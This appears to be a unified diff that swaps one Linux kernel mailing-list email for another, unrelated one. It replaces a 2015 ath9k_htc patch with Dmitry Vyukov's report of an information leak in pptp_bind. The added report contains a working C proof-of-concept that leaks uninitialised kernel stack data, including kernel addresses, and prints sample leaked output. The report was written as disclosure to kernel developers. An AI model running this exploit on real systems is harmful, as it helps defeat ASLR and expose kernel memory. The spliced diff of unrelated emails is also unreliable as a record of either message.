@@ -1,45 +1,62 @@
-From: Andrzej Hajda <a.hajda@samsung.com>
-Subject: [PATCH] ath9k_htc: fix handling return value of ath9k_hw_calibrate
-Date: Mon, 14 Dec 2015 11:06:01 +0100
-Message-ID: <1450087564-28441-4-git-send-email-a.hajda@samsung.com>
-References: <1450087564-28441-1-git-send-email-a.hajda@samsung.com>
-Cc: Andrzej Hajda <a.hajda@samsung.com>,
-	Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>,
-	Marek Szyprowski <m.szyprowski@samsung.com>,
-	Kalle Valo <kvalo@codeaurora.org>,
-	linux-wireless@vger.kernel.org, ath9k-devel@lists.ath9k.org,
-	netdev@vger.kernel.org, linux-kernel@vger.kernel.org
-To: QCA ath9k Development <ath9k-devel@qca.qualcomm.com>
+From: Dmitry Vyukov <dvyukov@gmail.com>
+Subject: Information leak in pptp_bind
+Date: Mon, 14 Dec 2015 11:38:28 +0100
+Message-ID: <CAEeQi3u5VDmmaLGHAzG1NOknXo=Ap0MdXZiYPusEX3VSx8R3Jw@mail.gmail.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Cc: syzkaller@googlegroups.com, Kostya Serebryany <kcc@google.com>,
+	Alexander Potapenko <glider@google.com>,
+	Dmitry Vyukov <dvyukov@google.com>, edumazet@google.com,
+	Sasha Levin <sasha.levin@oracle.com>, keescook@google.com,
+	jln@google.com
+To: Dmitry Kozlov <xeb@mail.ru>, netdev@vger.kernel.org,
+	LKML <linux-kernel@vger.kernel.org>
 Return-path: <linux-kernel-owner@vger.kernel.org>
-In-reply-to: <1450087564-28441-1-git-send-email-a.hajda@samsung.com>
 Sender: linux-kernel-owner@vger.kernel.org
 List-Id: netdev.vger.kernel.org
 
-The function can return negative values in case of error.
-Its result should be then tested for such case.
+Hello,
 
-The problem has been detected using proposed semantic patch
-scripts/coccinelle/tests/assign_signed_to_unsigned.cocci [1].
+The following program leak various uninit garbage including kernel
+addresses and whatever is on kernel stack, in particular defeating
+ASLR. The issue is in pptp_bind which does not verify sockaddr_len
 
-[1]: http://permalink.gmane.org/gmane.linux.kernel/2046107
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <linux/in.h>
+#include <linux/in6.h>
+#include <linux/socket.h>
+#include <linux/if.h>
+#include <linux/if_pppox.h>
+#include <errno.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
 
-Signed-off-by: Andrzej Hajda <a.hajda@samsung.com>
----
- drivers/net/wireless/ath/ath9k/htc_drv_main.c | 2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+int main(void)
+{
+        struct sockaddr sa;
+        unsigned len, i, try;
+        int fd;
 
-diff --git a/drivers/net/wireless/ath/ath9k/htc_drv_main.c b/drivers/net/wireless/ath/ath9k/htc_drv_main.c
-index a680a97..fe1fd1a 100644
---- a/drivers/net/wireless/ath/ath9k/htc_drv_main.c
-+++ b/drivers/net/wireless/ath/ath9k/htc_drv_main.c
-@@ -834,7 +834,7 @@ void ath9k_htc_ani_work(struct work_struct *work)
- 		if (longcal || shortcal)
- 			common->ani.caldone =
- 				ath9k_hw_calibrate(ah, ah->curchan,
--						   ah->rxchainmask, longcal);
-+						ah->rxchainmask, longcal) > 0;
- 
- 		ath9k_htc_ps_restore(priv);
- 	}
--- 
-1.9.1
+        for (try = 0; try < 5; try++) {
+                fd = socket(AF_PPPOX, SOCK_RAW, PX_PROTO_PPTP);
+                if (fd == -1)
+                        return;
+                memset(&sa, 0, sizeof(sa));
+                bind(fd, &sa, 0);
+                len = sizeof(sa);
+                getsockname(fd, &sa, &len);
+                for (i = 0; i < len; i++)
+                        printf("%02x", ((unsigned char*)&sa)[i]);
+                printf("\n");
+        }
+        return 0;
+}
+
+# ./a.out
+1800020000004700c012833d00880000b002400000000000005eddc66d2b
+1800020000004800408bf13a00880000b002400000000000005eddc66d2b
+180002000000490080a5f13a00880000b002400000000000005eddc66d2b
+1800020000004a00008ff13a00880000b002400000000000005eddc66d2b
+1800020000004b008096f13a00880000b002400000000000005eddc66d2b
